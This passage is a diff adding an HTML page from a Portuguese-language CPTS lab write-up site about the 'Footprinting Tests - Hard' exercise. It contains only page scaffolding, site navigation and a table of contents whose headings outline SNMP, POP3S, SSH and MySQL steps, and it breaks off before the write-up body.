@@ -1,0 +1,2229 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Writeups do curso preparatório CPTS">
+      
+      
+        <meta name="author" content="Matheus Navarro de Franca">
+      
+      
+        <link rel="canonical" href="https://thewzz.github.io/cpts-writeups/machines/footprinting-tests-hard/">
+      
+      
+        <link rel="prev" href="../footprinting-tests-medium/">
+      
+      
+        <link rel="next" href="../silentium/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>Footprinting Tests - Hard - CPTS Writeups</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../stylesheets/extra.css">
+    
+      <link rel="stylesheet" href="../../stylesheets/home.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="teal" data-md-color-accent="teal">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#footprinting-tests-hard" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="CPTS Writeups" class="md-header__button md-logo" aria-label="CPTS Writeups" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            CPTS Writeups
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Footprinting Tests - Hard
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="teal" data-md-color-accent="teal"  aria-hidden="true"  type="radio" name="__palette" id="__palette_0">
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="CPTS Writeups" class="md-nav__button md-logo" aria-label="CPTS Writeups" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    CPTS Writeups
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_1" id="__nav_1_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Máquinas
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_1_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Máquinas
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Índice
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_1_2" id="__nav_1_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Concluídos
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_1_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_1_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Concluídos
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1_2_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_1_2_1" id="__nav_1_2_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Easy
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_1_2_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_1_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Easy
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../getting-started/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Getting Started
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../robot/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Robot
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../cap/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CAP
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../dancing/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Dancing
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../redeemer/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Redeemer
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../footprinting-tests-easy/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Footprinting Tests - Easy
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1_2_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_1_2_2" id="__nav_1_2_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Medium
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_1_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_1_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Medium
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../footprinting-tests-medium/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Footprinting Tests - Medium
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1_2_3" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_1_2_3" id="__nav_1_2_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Hard
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_1_2_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_1_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Hard
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Footprinting Tests - Hard
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Footprinting Tests - Hard
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#informacoes-gerais" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        📋 Informações Gerais
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#enumeracao-inicial" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🔍 Enumeração Inicial
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🔍 Enumeração Inicial">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#portas-e-servicos-encontrados" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Portas e Serviços Encontrados
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#comandos-de-enumeracao" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Comandos de Enumeração
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#saida-relevante-evidencia" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Saída Relevante (evidência)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#descobertas" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Descobertas
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tecnicas-utilizadas" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🎯 Técnicas Utilizadas
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploracao-acesso-inicial" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🚀 Exploração / Acesso Inicial
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🚀 Exploração / Acesso Inicial">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#vetor-de-entrada" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Vetor de Entrada
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#processo" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Processo
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#etapa-1-snmp-brute-force-da-community-string" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Etapa 1 — SNMP: brute force da community string
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#etapa-2-snmpwalk-senha-do-tom-vazada" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Etapa 2 — snmpwalk: senha do tom vazada
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#etapa-3-pop3s-e-mail-do-tom-com-a-chave-ssh" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Etapa 3 — POP3S: e-mail do tom com a chave SSH
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#shell-e-pos-acesso" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🐚 Shell e Pós-Acesso
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🐚 Shell e Pós-Acesso">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#etapa-4-ssh-como-tom-com-a-chave-exfiltrada" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Etapa 4 — SSH como tom com a chave exfiltrada
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#etapa-5-bash_history-pista-do-mysql" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Etapa 5 — .bash_history: pista do MySQL
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#etapa-6-mysql-credenciais-do-htb" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Etapa 6 — MySQL: credenciais do HTB
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#flags" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🚩 Flags
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#resumo-tecnico" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        📖 Resumo Técnico
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#licoes-aprendidas" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        💡 Lições Aprendidas
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_1_3" id="__nav_1_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Em Andamento
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_1_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_1_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Em Andamento
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1_3_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_1_3_1" id="__nav_1_3_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Easy
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_1_3_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_1_3_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Easy
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../silentium/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Silentium
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../facts/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Facts
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Anotações
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Anotações
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_1" id="__nav_3_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Estudos Footprinting
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Estudos Footprinting
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../notes/footprinting/dns/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    DNS
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../notes/footprinting/smb-client/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SMB Client
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../notes/footprinting/smtp/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SMTP
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../notes/footprinting/oracle-tns/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ORACLE TNS
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../notes/footprinting/ipmi/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    IPMI
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#informacoes-gerais" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        📋 Informações Gerais
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#enumeracao-inicial" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🔍 Enumeração Inicial
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🔍 Enumeração Inicial">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#portas-e-servicos-encontrados" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Portas e Serviços Encontrados
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#comandos-de-enumeracao" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Comandos de Enumeração
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#saida-relevante-evidencia" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Saída Relevante (evidência)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#descobertas" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Descobertas
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tecnicas-utilizadas" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🎯 Técnicas Utilizadas
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploracao-acesso-inicial" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🚀 Exploração / Acesso Inicial
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🚀 Exploração / Acesso Inicial">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#vetor-de-entrada" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Vetor de Entrada
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#processo" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Processo
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#etapa-1-snmp-brute-force-da-community-string" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Etapa 1 — SNMP: brute force da community string
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#etapa-2-snmpwalk-senha-do-tom-vazada" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Etapa 2 — snmpwalk: senha do tom vazada
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#etapa-3-pop3s-e-mail-do-tom-com-a-chave-ssh" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Etapa 3 — POP3S: e-mail do tom com a chave SSH
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#shell-e-pos-acesso" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🐚 Shell e Pós-Acesso
